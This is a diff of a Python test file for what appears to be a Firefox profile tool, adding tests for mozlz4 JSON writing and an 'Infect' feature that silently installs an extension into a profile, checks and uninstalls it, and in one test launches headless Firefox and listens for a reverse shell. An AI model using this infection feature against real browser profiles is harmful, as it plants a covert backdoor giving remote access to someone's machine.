@@ -216,6 +216,11 @@ class TestFeatureHelpers:
         data = mock_feature.load_json_mozlz4('addonStartup.json.lz4')
         assert 'app-system-defaults' in data
 
+    def test_write_json_mozlz4(self, mock_feature):
+        mock_feature.write_json_mozlz4('test_json.json.lz4', {'foo': 'bar'})
+        data = mock_feature.load_json_mozlz4('test_json.json.lz4')
+        assert data == {'foo': 'bar'}
+
 
 class TestSmallFeatures:
 
@@ -448,7 +453,6 @@ class TestPreferencesFeature:
         assert 'baz = 456' in lines
         assert 'abc = "def"' in lines
         assert 'userkey = "userval"' in lines
-        # TODO More feature tests
 
     def test_summary(self, mock_session, capsys):
         Preferences(mock_session, summary=True)()
@@ -512,15 +516,67 @@ class TestInfectFeature:
         out, _ = capsys.readouterr()
         assert 'doesn\'t seem (fully) installed' in out
 
+    def test_infect_cycle(self, mock_session, capsys, monkeypatch):
+        def assert_not_installed():
+            Infect(mock_session, want_check=True)()
+            out, _ = capsys.readouterr()
+            assert 'doesn\'t seem (fully) installed' in out
+
+        def assert_installed():
+            Infect(mock_session, want_check=True)()
+            out, _ = capsys.readouterr()
+            assert 'Extension seems installed' in out
+
+        assert_not_installed()
+
+        # Start infect, but cancel before execution
+        monkeypatch.setattr('builtins.input', lambda: 'n')
+        with pytest.raises(FatalError, match='Cancelled.'):
+            Infect(mock_session)()
+
+        # Start infect and confirm
+        monkeypatch.setattr('builtins.input', lambda: 'y')
+        Infect(mock_session)()
+        out, err = capsys.readouterr()
+        assert 'Installing' in out
+        assert 'Warning:' not in err
+
+        assert_installed()
+
+        # Try to install again, which should raise warnings
+        Infect(mock_session)()
+        out, err = capsys.readouterr()
+        assert 'Addon entry "infect@example.com" already exists.' in err
+        assert 'Addon already registered in "addonStartup.json.lz4".' in err
+        assert 'XPI already exists at' in err
+
+        # Uninstall
+        Infect(mock_session, want_uninstall=True)()
+        out, err = capsys.readouterr()
+        assert 'Updating "extensions.json".' in out
+        assert 'Updating "addonStartup.json.lz4".' in out
+        assert 'Warning:' not in err
+
+        assert_not_installed()
+
+        # Uninstall again, which should raise warnings
+        Infect(mock_session, want_uninstall=True)()
+        out, err = capsys.readouterr()
+        assert 'Warning: ' in err
+        assert 'Can\'t remove addon from "extensions.json".' in err
+        assert 'Can\'t remove addon entry from "addonStartup.json.lz4"' in err
+        assert 'Can\'t remove XPI.'
+
     @mark.unstable
-    def test_infect(self, capsys, tmpdir, monkeypatch):
-        # TODO Make this test work on Travis.
+    def test_infect_cycle_with_firefox(self, capsys, tmpdir, monkeypatch):
+        # TODO Make this test work on Travis
         timeout = 10
         profile_dir = Path(tmpdir) / 'realprofile'
 
         def run_firefox():
-            return subprocess.Popen(['firefox', '--profile', str(profile_dir),
-                                     '-headless'])
+            return subprocess.Popen(
+                ['firefox', '--profile', str(profile_dir), '-headless']
+            )
 
         os.makedirs(profile_dir)
 
@@ -551,25 +607,21 @@ class TestInfectFeature:
             time.sleep(0.01)
         p.terminate()
 
+        # Addon should not be installed
         session = Session(profile=profile_dir)
         Infect(session, want_check=True)()
         out, _ = capsys.readouterr()
         assert 'doesn\'t seem (fully) installed' in out
 
-        monkeypatch.setattr('builtins.input', lambda: 'n')
-        with pytest.raises(FatalError, match='Cancelled.'):
-            Infect(session)()
+        # Install addon
+        Infect(session, yes=True)()
 
-        monkeypatch.setattr('builtins.input', lambda: 'y')
-        Infect(session)()
-        out, _ = capsys.readouterr()
-        assert 'Installing...' in out
-        assert 'Warning:' not in out # TODO
-
+        # Addon should be installed
         Infect(session, want_check=True)()
         out, _ = capsys.readouterr()
         assert 'Extension seems installed' in out
 
+        # Wait for reverse shell and interact with it
         p = run_firefox()
         s = socket(AF_INET, SOCK_STREAM)
         s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
